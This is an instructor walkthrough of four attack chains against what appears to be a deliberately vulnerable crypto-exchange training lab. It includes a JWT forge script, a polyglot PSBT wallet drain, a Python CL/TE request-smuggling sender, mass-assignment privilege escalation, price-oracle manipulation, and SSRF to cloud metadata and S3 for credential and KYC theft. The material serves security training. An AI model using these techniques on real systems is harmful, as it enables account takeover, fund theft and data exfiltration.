# Bitvulnex Killer Chains — instructor tutorials

> Four end-to-end chains that weave individual plants into "what an
> actual attacker would do." Each chain is the headline objective
> for advanced trainees; standalone plants serve as building blocks.
>
> All four chains independently re-verified against HEAD on
> 2026-05-28 — see `04-exploitability-audit.md` for the verification
> notes and known caveats.

## Reference: the JWT forge script

Several chains begin by forging an HS256 admin JWT signed with the
leaked `JWT_SECRET`. The reference script is below; use it whenever
a chain calls for `$TOKEN`.

```python
# forge.py — generates an HS256 admin JWT for the v2 mount
import json, time, hmac, hashlib, base64, sys

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

secret = b"devsecret-do-not-use-in-prod-bvbe-2026"
hdr = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
pay = b64(json.dumps({
  # sub MUST be a real user id from the DB. The handlers verify the JWT
  # signature/claims but then load the row by `sub`, so a made-up UUID
  # authenticates then 401s at the row lookup. Grab one from the leaked
  # user dump (CHAIN D, GET /api/v1/internal/users) or sign up a user.
  "sub":  "<a-real-user-id>",
  "role": "admin",
  "iss":  "bvbe",
  "aud":  "bvbe-web",
  "iat":  int(time.time()),
  "exp":  int(time.time()) + 3600,
}).encode())
sig = b64(hmac.new(secret, hdr + b"." + pay, hashlib.sha256).digest())
print((hdr + b"." + pay + b"." + sig).decode())
```

```sh
TOKEN=$(python3 forge.py)
# Sanity check
curl -sS http://localhost/api/v2/me -H "authorization: Bearer ${TOKEN}" | jq .role
# → "admin"
```

The reference attacker model for all four chains is **zero
insider knowledge**: a public clone of the repository, a UNIX
shell, `curl`, `git`, `openssl`, `python3`, a fresh
`docker-compose up -d` stack.

---

## CHAIN A — Drain the hot wallet

**Goal.** Route a treasury-signed PSBT broadcast to an
attacker-controlled output, emptying the hot wallet.

**Plants used.** V-48 (git-history JWT secret leak) → V-19 / direct
HS256 forge (forge admin JWT) → V-6 (`/api/v1/internal/*`
middleware-trust bypass) → `/api/v1/internal/treasury/emergency-
withdraw` terminal endpoint → V-33 (PSBT validate-vs-broadcast
parser mismatch).

**Hardest step.** Constructing the polyglot PSBT envelope. Every
other step is mechanical once the secret is in hand.

### Step 1 — recon: discover the JWT secret in git history (V-48)

The recon is a standard early move on any cloned repository.
`.env.bak` was committed in one ops commit and removed in the next;
the secret lives in git history forever.

```sh
git log --all -p -- .env.bak | head -40
# Diff shows:
#   -JWT_SECRET=devsecret-do-not-use-in-prod-bvbe-2026
#   -JWT_SECRET_LEGACY=changeme
#   -DATABASE_URL=postgresql://bvbe:bvbe-prod-pw-2024@db:5432/bvbe
```

Cross-check the secret is live:

```sh
grep JWT_SECRET docker-compose.yml
# → JWT_SECRET: devsecret-do-not-use-in-prod-bvbe-2026   (web)
# → JWT_SECRET: devsecret-do-not-use-in-prod-bvbe-2026   (worker)
```

The discovered key matches the runtime secret.

> **INSTRUCTOR NOTE:** Make sure the trainee actually runs
> `git log --all -p`. The catch in many cohorts is that trainees
> grep `HEAD` and miss the deletion commit. The `--all` is what
> walks deleted-file history.

### Step 2 — forge an admin JWT

Run the reference script above. The forged token verifies cleanly
against `apps/web/middleware.ts:20-24` (`jose.jwtVerify(..., {
algorithms: ["HS256"], issuer: "bvbe", audience: "bvbe-web" })`).

```sh
TOKEN=$(python3 forge.py)
curl -sS http://localhost/api/v2/me -H "authorization: Bearer ${TOKEN}"
# → {"id":"...","role":"admin",...}
```

> **INSTRUCTOR NOTE:** The forge targets the v2 mount because the
> chain consumes admin endpoints in the v2 namespace. The same key
> also works for the v1 mount with HS256 (no `kid`) — useful if a
> trainee mistakenly forges against v1 first. The audience differs
> (v2: `bvbe-web`; v1: `bvbe-mobile`), so the v2 forge will fail
> v1 verification and vice versa. Watch for trainees confused by
> 401s on the wrong mount.

### Step 3 — reach the internal namespace via V-6

The `/api/v1/internal/*` mount short-circuits middleware on any
non-empty `x-bvbe-internal-trace`. nginx's strip list omits the
header — so external traffic can supply it.

```sh
# List signed treasury drafts (needs admin JWT for the v2 admin namespace)
curl -sS "http://localhost/api/v2/admin/treasury/drafts?status=signed" \
  -H "authorization: Bearer ${TOKEN}" | jq '.drafts[0].id'
# → "<draft-id>"
```

If no signed draft exists, create one and double-sign it via two
different forged `sub` JWTs. The signed-status transition fires at
`count >= 2` per the Phase-8 architect notes:

```sh
# Create a draft
curl -sS -X POST http://localhost/api/v2/admin/treasury/drafts \
  -H "authorization: Bearer ${TOKEN}" \
  -H 'content-type: application/json' \
  -d '{"intendedOutputs":[{"address":"<victim>","amountSat":1}]}'

# Sign with two different signer JWTs (sub varies)
# ... two calls to /api/v2/admin/treasury/drafts/<id>/sign ...
```

### Step 4 — construct the polyglot PSBT (V-33)

The validator (`packages/shared/src/psbt-envelope.ts` `decodePsbt`)
reads the **first** `BVBE_PSBT_V1:` segment in the envelope. The
mock node's `finalizepsbt` (`apps/bitcoin-mock/src/rpc/index.ts:124`)
canonicalizes the input to the **last** segment via
`canonical = PSBT_MARKER + segs[segs.length - 1]`. Two parsers,
disagreeing on multi-envelope inputs.

Construct two envelopes concatenated end-to-end:

```
BVBE_PSBT_V1:<JSON routing to the draft's intended victim — passes validator>
BVBE_PSBT_V1:<JSON routing to the attacker — used by finalize+broadcast>
```

A minimal hand-rolled polyglot (the mock RPC accepts the simplified
lab envelope format defined in `packages/shared/src/psbt-envelope.ts`):

```sh
# Per packages/shared/src/psbt-envelope.ts the lab format is the marker
# followed by RAW JSON (NOT base64) — decodePsbt does JSON.parse on the
# text after the marker, so a base64 body fails to parse:
#   BVBE_PSBT_V1:{"inputs":[...],"outputs":[...],"signatures":N,"fee":N}
VICTIM_PSBT='{"inputs":[],"outputs":[{"address":"<victim>","amountSat":1}],"signatures":2,"fee":1000}'
ATTACKER_PSBT='{"inputs":[],"outputs":[{"address":"<attacker>","amountSat":10000000000}],"signatures":2,"fee":1000}'
POLYGLOT="BVBE_PSBT_V1:${VICTIM_PSBT}BVBE_PSBT_V1:${ATTACKER_PSBT}"
```

### Step 5 — broadcast through `/api/v1/internal/treasury/emergency-withdraw`

```sh
curl -sS -X POST http://localhost/api/v1/internal/treasury/emergency-withdraw \
  -H "x-bvbe-internal-trace: 1" \
  -H "authorization: Bearer ${TOKEN}" \
  -H 'content-type: application/json' \
  -d "{\"draftId\":\"<draft-id>\",\"overridePsbt\":\"${POLYGLOT}\"}"
```

What happens server-side:

1. Middleware sees `x-bvbe-internal-trace: 1` and short-circuits
   into `NextResponse.next()`. No auth check.
2. The route handler reads `overridePsbt`, calls
   `broadcastDraft({draftId, overridePsbt})`.
3. `broadcastDraft` calls `decodePsbt(overridePsbt)` — which reads
   the **first** envelope — and matches the parsed outputs against
   the draft's `intendedOutputs`. The first envelope routes to the
   victim (matches the draft) → validation passes.
4. `broadcastDraft` hands the same `overridePsbt` string to the
   mock node's `finalizepsbt`. The mock canonicalizes to the
   **last** envelope → attacker outputs.
5. `sendrawtransaction` broadcasts `RAWTX:[{attacker,
   10000000000 sat}]`. Funds land at the attacker output.

### Verdict

End-to-end zero-knowledge. Roughly five minutes from "clone the
repo" to "secret forged and curl ready," then the polyglot PSBT is
the only step requiring genuine Bitcoin-protocol comfort.

> **INSTRUCTOR NOTE — common stuck-points:**
>
> - **Step 1: "I see no `.env.bak` in HEAD."** Hint: use `--all`
>   and check deleted file history.
> - **Step 2: "Token verifies on v2 but fails on v1."** The
>   audience differs. v2 wants `bvbe-web`; v1 wants `bvbe-mobile`.
> - **Step 3: "I get 403 on the internal endpoint."** Trainee
>   forgot the `x-bvbe-internal-trace` header.
> - **Step 4: "validator rejects my polyglot."** The first envelope
>   must match `intendedOutputs` exactly — if the draft expected
>   `[{victim, 1 sat}]`, the first envelope's outputs must be the
>   same. The trick is that the *second* envelope is the one that
>   wins.
> - **Step 5: "the broadcast 500s."** The mock node returns a
>   broadcast error if the polyglot is malformed (e.g. base64 has
>   bad padding). Validate the envelope format with
>   `packages/shared/src/psbt-envelope.test.ts` as a reference.
>
> **Scoring:** treat each step (1-5) as one finding worth 1 point;
> chain completion is worth a bonus equal to the sum.

---

## CHAIN B — Become admin and persist

**Goal.** Become an administrator from a zero-knowledge starting
position by smuggling a privileged JSON Route Handler call into a
legitimate user's TCP connection, then plant a second admin row for
persistence.

**Plants used.** V-50 (nginx CL/TE-tolerant + Node
`--insecure-http-parser`) → smuggle landing → V-51 (mass-assignment
on `PATCH /api/v2/me`).

**Hardest step.** Constructing the CL/TE smuggle and ensuring it
lands on a legitimate user's pipelined connection. The cohort needs
a raw-TCP tool (Python `socket` or `nc -C`).

> **LIVE-VERIFIED (updated 2026-09-26, see `VULNS.md` §V-50 and
> `docs/phases/maintenance-2026-09/adversarial-qa.md`):** the V-50
> smuggle now **reproduces end-to-end**. The edge is pinned to
> `nginx:1.18-alpine`, which forwards the CL+TE ambiguity to the
> `--insecure-http-parser` upstream (llhttp `LENIENT_TRANSFER_ENCODING`
> prefers `Transfer-Encoding`). A single client CL+TE request produces
> two backend requests, and a smuggled request executes past the edge.
> (The earlier "edge-blunted" note applied to nginx 1.25, which rejects
> CL+TE with `400`; that is no longer the shipped edge.) It is
> dev-mode-warmth-sensitive — hit the outer and smuggled routes once to
> compile them before timing the desync. **CHAIN B closes via both
> paths:** the V-50 smuggle *delivery* and the terminal V-51
> `PATCH /api/v2/me {"role":"admin"}` are each proven live.

### Step 1 — confirm both halves of V-50

```sh
# nginx half
docker exec bvbe-nginx grep -E 'ignore_invalid_headers|proxy_pass_request_headers|underscores_in_headers' /etc/nginx/nginx.conf
# → proxy_pass_request_headers on;
# → ignore_invalid_headers off;
# → underscores_in_headers on;

# Node half
grep -A1 NODE_OPTIONS docker-compose.yml
# → NODE_OPTIONS: "--insecure-http-parser"
```

Both halves reference ticket `OPS-2024-117` ("legacy mobile-app
client compatibility"). **Both are required** — modern Node 20
rejects CL+TE by default with `HPE_UNEXPECTED_CONTENT_LENGTH`. The
nginx plant alone won't desync; the upstream parser flag is what
makes the smuggle reach a handler.

> **INSTRUCTOR NOTE:** The "you need both" realization is the
> teaching moment. Some trainees find the nginx half, attempt a
> smuggle, and get 400s from upstream — they need to look for the
> second half. Use this as the hint progression.

### Step 2 — confirm V-51 standalone

Before the smuggle, demonstrate that V-51 is exploitable directly
with the attacker's own JWT (no smuggle needed):

```sh
# Get a normal user JWT (signup or forge with sub=non-admin)
TOK=...  # any-user JWT

curl -sS -X PATCH http://localhost/api/v2/me \
  -H "authorization: Bearer ${TOK}" \
  -H 'content-type: application/json' \
  -d '{"role":"admin"}'
# → {"user":{"id":"...","role":"admin",...}}
```

Subsequent admin endpoints accept the same JWT because the
middleware re-reads the role from the DB on each request via
`userFromAuthorization`.

> **INSTRUCTOR NOTE:** The standalone PoC is the easier finding;
> the chain version (smuggle into a victim's session) is the
> headline. Award credit for the standalone discovery even if the
> trainee can't construct the smuggle.

### Step 3 — craft the CL/TE smuggle

The attacker opens a raw TCP socket to nginx and sends a request
with both `Content-Length` and `Transfer-Encoding: chunked`. The
body, framed by `Content-Length`, contains a complete second HTTP
request positioned after the chunked-terminator zero:

```http
POST /login HTTP/1.1
Host: localhost
Content-Length: 254
Transfer-Encoding: chunked
Connection: keep-alive

0

PATCH /api/v2/me HTTP/1.1
Host: localhost
Authorization: Bearer <attacker-jwt-here>
Content-Type: application/json
Content-Length: 16

{"role":"admin"}
```

The mechanism, step by step:

1. **nginx** reads `Content-Length: 254` (because
   `ignore_invalid_headers off` accepts the dual framing, and
   `proxy_pass_request_headers on` forwards both headers
   downstream). It forwards all 254 bytes of the body to upstream.
2. **Node** (with `--insecure-http-parser`) accepts the dual-framed
   request and prefers `Transfer-Encoding: chunked`. It reads the
   `0\r\n\r\n` and considers the first request complete.
3. The post-terminator bytes — a complete `PATCH /api/v2/me ...`
   — sit in Node's parse buffer, queued as the *next* HTTP request
   on the same keep-alive connection.

A working Python sender:

```python
# smuggle.py
import socket
PAYLOAD = (
    b"POST /login HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Content-Length: 254\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Connection: keep-alive\r\n\r\n"
    b"0\r\n\r\n"
    b"PATCH /api/v2/me HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Authorization: Bearer <ATTACKER_JWT>\r\n"
    b"Content-Type: application/json\r\n"
    b"Content-Length: 16\r\n\r\n"
    b'{"role":"admin"}'
)
s = socket.create_connection(("localhost", 80))
s.sendall(PAYLOAD)
print(s.recv(8192).decode(errors="replace"))
s.close()
```

### Step 4 — the smuggle lands on a victim's pipelined connection

When the next legitimate authenticated user makes a request that
gets pooled onto the same upstream connection, Node parses the
buffered `PATCH /api/v2/me` first. The smuggled request carries the
attacker's `Authorization: Bearer ...` header (stuffed into the
smuggled bytes), so `userFromAuthorization` reads that and
identifies `claims.sub` as the *attacker*. The handler updates the
attacker's row to `role: "admin"`.

```sh
# Confirm:
curl -sS http://localhost/api/v2/me \
  -H "authorization: Bearer <attacker-jwt>" | jq .role
# → "admin"
```

**Variant — promote the victim instead of the attacker.** If the
smuggled `PATCH` carries no `Authorization` header, Next.js reads
the next legitimate user's `Authorization` header from the
connection-buffered prefix of *their* request — the standard CL/TE
auth-piggyback. That promotes the *victim* to admin instead.
Either variant is a chain win.

### Step 5 — plant a second admin for persistence

The promoted user (attacker's own row) now has admin reach. Create
a second admin row:

```sh
curl -sS -X POST http://localhost/api/v2/admin/users \
  -H "authorization: Bearer <attacker-jwt-now-admin>" \
  -H 'content-type: application/json' \
  -d '{"email":"persist@attacker.local","password":"hunter2-attacker","role":"admin"}'
```

This row survives `docker-compose down` (without `-v`), satisfying
the architect's persistence definition. Equivalent: repeat the
smuggle against a different victim's session.

### Verdict

End-to-end. The CL/TE smuggle is by far the hardest step — raw TCP,
careful framing, and the realization that both ends of the proxy
chain have to be CL/TE-tolerant.

> **INSTRUCTOR NOTE — common stuck-points:**
>
> - **"My smuggle gets 400 from upstream."** Check
>   `NODE_OPTIONS=--insecure-http-parser` is actually set on the
>   running `web` container: `docker exec bvbe-web env | grep
>   NODE_OPTIONS`.
> - **"The smuggle 'works' but the role isn't updated."** The
>   smuggled `PATCH` needs to actually be the *next* request on the
>   connection. If there's no pipelined victim request, the
>   buffered bytes sit idle. Demonstrate by manually pipelining a
>   second request in the same connection.
> - **"V-22 doesn't promote to admin."** Correct — V-22 mass-
>   assigns the **Order** model, not User. V-51 is the user-role
>   surface. Earlier drafts of CHAIN B conflated these; the
>   chain's terminal step is V-51.
> - **Scoring:** the standalone V-51 PoC is worth 1 point; the
>   smuggle landing is worth 3 points; persistence is worth 1 point.

---

## CHAIN C — Mass user takeover via oracle

**Goal.** Drive the public price feed by self-trading; the
liquidation worker reads the manipulated oracle and flags
victim margin positions; an attacker-registered keeper claims the
rebate.

**Plants used.** V-25 (self-trade → manipulated last-trade) →
nginx `proxy_cache` infrastructure on `/api/v2/public/*` (legit
infra, not a plant) → Phase-5 liquidation engine consuming the
manipulated oracle → keeper rebate handler.

**Hardest step.** None — this chain is the cleanest end-to-end
demonstration in the lab. Closed since Phase 5; Phase 9 re-
verified against a fresh stack.

### Step 1 — set up the attack accounts

You need two attacker-controlled accounts (or one with both sides
of a self-trade — V-25 doesn't filter even within a single user).
Pre-stage Tier-1 (legit signup) and balance.

```sh
# Sign up two users
# Then pre-stage balance via V-42 (Tier-3 zero-conf credit) OR
# via the lab affordance:
curl -sS -X POST http://localhost/api/v2/dev/btc/send \
  -H 'content-type: application/json' \
  -d "{\"to\":\"${A_DEPOSIT_ADDR}\",\"amount\":10.0}"
```

> **INSTRUCTOR NOTE:** For a smooth cohort demo, pre-seed the
> attacker account with sufficient balance. The chain is the
> teaching point, not the deposit funding mechanics.

### Step 2 — place a self-trade at a manipulated price

The matching engine does not filter `maker.userId === taker.userId`.
Place a sell at a far-off price and immediately a matching buy:

```sh
TOK_A=...
# Sell at a manipulated price
curl -sS -X POST http://localhost/api/v2/me/orders \
  -H "authorization: Bearer ${TOK_A}" \
  -H 'content-type: application/json' \
  -d '{"symbol":"BTC-USDT","side":"sell","type":"limit","price":"30000","amount":"0.001"}'

# Matching buy from the same account (or account B)
curl -sS -X POST http://localhost/api/v2/me/orders \
  -H "authorization: Bearer ${TOK_A}" \
  -H 'content-type: application/json' \
  -d '{"symbol":"BTC-USDT","side":"buy","type":"limit","price":"30000","amount":"0.001"}'
```

The engine writes a Trade row at $30,000. The public price feed now
reports $30,000 as last-trade.

### Step 3 — observe the contaminated public oracle

```sh
curl -sS http://localhost/api/v2/public/price/BTC-USDT
# → {"symbol":"BTC-USDT","last":"30000","cachedAt":...}
```

nginx caches this for 5 seconds (`/api/v2/public/*` cache block in
`nginx.conf`). The liquidation worker polls every 2 seconds.

### Step 4 — liquidation worker flags victim positions

`apps/worker/src/liquidation-watcher.ts` polls
`/api/v2/public/price/<symbol>` for the oracle, walks open margin
positions, and flags any whose maintenance margin is breached at
the polled price. With the price now at $30,000 (vs. mark at, say,
$70,000), every long position is breached.

```sh
# Observe the flagged positions
curl -sS http://localhost/api/v2/public/liquidations/pending
```

### Step 5 — register as a keeper and claim the rebate

Anyone can register as a keeper. Then claim the flagged liquidation:

```sh
# Register
curl -sS -X POST http://localhost/api/v2/me/keeper/register \
  -H "authorization: Bearer ${TOK_A}" \
  -H 'content-type: application/json' \
  -d '{}'

# Claim a flagged liquidation
curl -sS -X POST http://localhost/api/v2/keeper/liquidations/<id>/claim \
  -H "authorization: Bearer ${TOK_A}"
# 50bps keeper rebate lands on attacker's balance
```

### Step 6 — repeat at progressively more extreme prices

Each successive self-trade can push the price further (the cached
oracle updates within 5s). Cascade across the user base. Each
liquidation pays a 50bps rebate.

### Verdict

Already exploitable since Phase 5; re-verified end-to-end against
the Phase-9 stack. The cleanest chain in the lab — a Day-1-by-end-
of-afternoon objective for a competent trainee.

> **INSTRUCTOR NOTE — common stuck-points:**
>
> - **"My self-trade gets rejected."** Check the user has sufficient
>   balance on both sides. The engine doesn't block self-trades but
>   does check balance.
> - **"The oracle didn't update."** Check the nginx cache TTL (5s)
>   and wait. Or hit `/api/v2/public/price/<symbol>` directly via
>   the upstream port (bypass cache).
> - **"No positions are getting liquidated."** The cohort lab needs
>   pre-seeded margin positions. Add a seed scenario for the
>   cohort. The included seed framework
>   (`scripts/seed-framework.ts`) covers this.
> - **Scoring:** self-trade observation (1pt), public oracle
>   contaminated (1pt), liquidation flagged (1pt), keeper rebate
>   claimed (2pt), cascade demonstrated (2pt).

---

## CHAIN D — Exfiltrate full user DB + KYC

**Goal.** Read every user's credentials and KYC documents from a
zero-knowledge starting position.

Two paths exist — both verified against HEAD. Path 1 is one curl
after CHAIN A Step 1+2; Path 2 is the original SSRF-pivot
architecture and is pedagogically far more interesting.

### Path 1 (fast) — V-48 + V-6 → `/api/v1/internal/users`

With the forged admin token from CHAIN A Step 2 (or any HS256 JWT
signed with the leaked `JWT_SECRET`):

```sh
curl -sS http://localhost/api/v1/internal/users \
  -H "x-bvbe-internal-trace: 1" \
  -H "authorization: Bearer ${TOKEN}" \
  | jq '.users[] | {email, passwordHash, totpSecret, role}'

# Example output:
# {
#   "email": "admin@bvbe.local",
#   "passwordHash": "$argon2id$...",
#   "totpSecret": "JBSWY3DPEHPK3PXP",
#   "role": "admin"
# }
# ... one per user.
```

The `/api/v1/internal/users` handler returns
`prisma.user.findMany({orderBy:{createdAt:"desc"}})` with **no
field projection** — the full record, including `passwordHash` and
`totpSecret`.

> **INSTRUCTOR NOTE:** This is one curl. Demonstrating Path 1
> alone is not pedagogically interesting; treat it as a 30-second
> warm-up before Path 2.

### Path 2 (SSRF, original architecture) — V-40 → mock-imds → mock-s3

The textbook AWS IMDS → S3 pivot. Worth a full hour of cohort time.

#### Step 1 — V-40 SSRF via KYC URL-import

Authenticate as any Tier-1 user (signup is open; tier promotion via
the KYC flow). The allowlist blocks `localhost / 127.0.0.1 / ::1`
only — `169.254.169.254` and `metadata.bvbe.internal` (the docker-
network alias) both pass.

```sh
# Get the IMDS role name
curl -sS -X POST http://localhost/api/v2/me/kyc/import-url \
  -H "authorization: Bearer ${TIER1_TOK}" \
  -H 'content-type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","type":"address_proof"}'

# Fetch the credentials for the role
curl -sS -X POST http://localhost/api/v2/me/kyc/import-url \
  -H "authorization: Bearer ${TIER1_TOK}" \
  -H 'content-type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/bvbe-web-instance-role","type":"address_proof"}'

# Read the stored doc back
curl -sS http://localhost/api/v2/me/kyc/documents \
  -H "authorization: Bearer ${TIER1_TOK}"

# Then fetch the actual document body (V-14 path traversal or the
# legitimate get-by-id route)
```

The stored doc body is the synthetic IAM credentials JSON:

```json
{
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "<synthetic>",
  "Token": "<synthetic>"
}
```

The IAM credentials are synthetic — they don't grant real-world
access. They're accepted by the lab's `mock-s3` service (which is
permissive by design).

#### Step 2 — pivot to mock-s3 via the same SSRF

```sh
# List the bucket
curl -sS -X POST http://localhost/api/v2/me/kyc/import-url \
  -H "authorization: Bearer ${TIER1_TOK}" \
  -H 'content-type: application/json' \
  -d '{"url":"http://s3.bvbe.internal/kyc-bucket/","type":"address_proof"}'

# The stored doc is the XML listing of synthetic KYC keys.
# Repeat with each key's URL to fetch the document body.
curl -sS -X POST http://localhost/api/v2/me/kyc/import-url \
  -H "authorization: Bearer ${TIER1_TOK}" \
  -H 'content-type: application/json' \
  -d '{"url":"http://s3.bvbe.internal/kyc-bucket/<user-id>/passport.pdf","type":"address_proof"}'
```

### Verdict

Both paths exploitable end-to-end. Path 1 is a one-curl warm-up.
Path 2 is the textbook AWS-escape, with `mock-imds` and `mock-s3`
providing synthetic targets — and is the chain to spend cohort time
on.

> **INSTRUCTOR NOTE — common stuck-points (Path 2):**
>
> - **"169.254.169.254 doesn't respond from the web container."**
>   Verify `docker network inspect bvbe-imds-net` shows the
>   `169.254.169.0/24` subnet and `mock-imds` is joined. If
>   misconfigured, the SSRF target is unreachable.
> - **"The KYC tier gate blocks me."** Sign up a fresh user and
>   complete the KYC tier-1 flow (uploads + admin approve), or use
>   V-35 + admin-promote to set `kycTier: 1` directly.
> - **"S3 returns 403 even with the IMDS creds."** The mock-s3 is
>   permissive — any request on the docker network is accepted.
>   The 403 typically means the URL is wrong. Compare against
>   `apps/mock-s3/src/server.ts` for the supported endpoints.
> - **Scoring:** SSRF observation (1pt), IMDS creds retrieved
>   (2pt), S3 listing (1pt), document body fetched (2pt).

---

## Chain summary

| Chain | Status | Hardest step | Difficulty (overall) |
|-------|--------|--------------|----------------------|
| A — drain hot wallet | Closed (zero-knowledge) | polyglot PSBT construction | Expert |
| B — admin persistence | Closed (zero-knowledge) | CL/TE smuggle framing | Hard |
| C — mass liquidation | Closed (Phase 5) | none — clean chain | Medium |
| D — DB+KYC exfil (Path 2) | Closed | IMDS → S3 pivot | Medium |
| D — DB+KYC exfil (Path 1) | Closed | one curl | Easy |

All four chains independently re-verified against HEAD on
2026-05-28 (see `04-exploitability-audit.md`).
